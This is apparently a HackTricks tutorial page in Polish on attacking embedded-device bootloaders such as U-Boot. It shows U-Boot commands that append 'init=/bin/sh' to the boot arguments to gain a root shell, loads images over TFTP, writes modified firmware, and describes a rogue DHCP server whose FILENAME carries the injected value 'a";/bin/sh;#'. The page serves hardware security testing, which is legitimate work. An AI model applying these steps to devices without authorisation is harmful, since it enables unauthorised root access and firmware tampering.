{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Zalecane kroki do modyfikacji konfiguracji uruchamiania urządzenia i bootloaderów, takich jak U-boot:

1. **Dostęp do powłoki interpretera bootloadera**:
- Podczas uruchamiania naciśnij "0", spację lub inne zidentyfikowane "magiczne kody", aby uzyskać dostęp do powłoki interpretera bootloadera.

2. **Modyfikacja argumentów uruchamiania**:
- Wykonaj następujące polecenia, aby dodać '`init=/bin/sh`' do argumentów uruchamiania, co pozwoli na wykonanie polecenia powłoki:
%%%
#printenv
#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
#saveenv
#boot
%%%

3. **Konfiguracja serwera TFTP**:
- Skonfiguruj serwer TFTP, aby ładować obrazy przez lokalną sieć:
%%%
#setenv ipaddr 192.168.2.2 #lokalny adres IP urządzenia
#setenv serverip 192.168.2.1 #adres IP serwera TFTP
#saveenv
#reset
#ping 192.168.2.1 #sprawdź dostęp do sieci
#tftp ${loadaddr} uImage-3.6.35 #loadaddr przyjmuje adres, do którego ma zostać załadowany plik oraz nazwę pliku obrazu na serwerze TFTP
%%%

4. **Wykorzystanie `ubootwrite.py`**:
- Użyj `ubootwrite.py`, aby zapisać obraz U-boot i wprowadzić zmodyfikowane oprogramowanie układowe, aby uzyskać dostęp root.

5. **Sprawdzenie funkcji debugowania**:
- Zweryfikuj, czy funkcje debugowania, takie jak szczegółowe logowanie, ładowanie dowolnych rdzeni lub uruchamianie z nieznanych źródeł, są włączone.

6. **Ostrożność przy zakłóceniach sprzętowych**:
- Bądź ostrożny podczas łączenia jednego pinu z masą i interakcji z chipami SPI lub NAND flash podczas sekwencji uruchamiania urządzenia, szczególnie przed dekompresją jądra. Skonsultuj się z kartą katalogową chipu NAND flash przed skracaniem pinów.

7. **Konfiguracja fałszywego serwera DHCP**:
- Skonfiguruj fałszywy serwer DHCP z złośliwymi parametrami, które urządzenie ma pobrać podczas uruchamiania PXE. Wykorzystaj narzędzia, takie jak serwer pomocniczy DHCP Metasploit (MSF). Zmodyfikuj parametr 'FILENAME' za pomocą poleceń wstrzykiwania, takich jak `'a";/bin/sh;#'`, aby przetestować walidację wejścia dla procedur uruchamiania urządzenia.

**Uwaga**: Kroki związane z fizyczną interakcją z pinami urządzenia (*oznaczone gwiazdkami) powinny być podejmowane z ekstremalną ostrożnością, aby uniknąć uszkodzenia urządzenia.


## References
* [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
